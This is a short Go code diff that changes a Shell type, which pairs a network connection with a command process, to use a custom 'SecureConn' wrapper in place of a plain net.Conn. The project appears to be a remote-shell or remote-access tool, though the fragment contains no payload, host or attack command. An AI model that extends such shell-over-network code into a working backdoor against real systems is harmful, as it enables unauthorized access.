@@ -2,21 +2,21 @@ package core
 
 import (
     "fmt"
-    "net"
     "os"
     "os/exec"
     "runtime"
     "syscall"
     "time"
     "unsafe"
+		"nedo-phantom/internal/common"
 )
 
 type Shell struct {
-    conn net.Conn
+    conn *common.SecureConn
     cmd  *exec.Cmd
 }
 
-func NewShell(conn net.Conn) *Shell {
+func NewShell(conn *common.SecureConn) *Shell {
     return &Shell{conn: conn}
 }
 
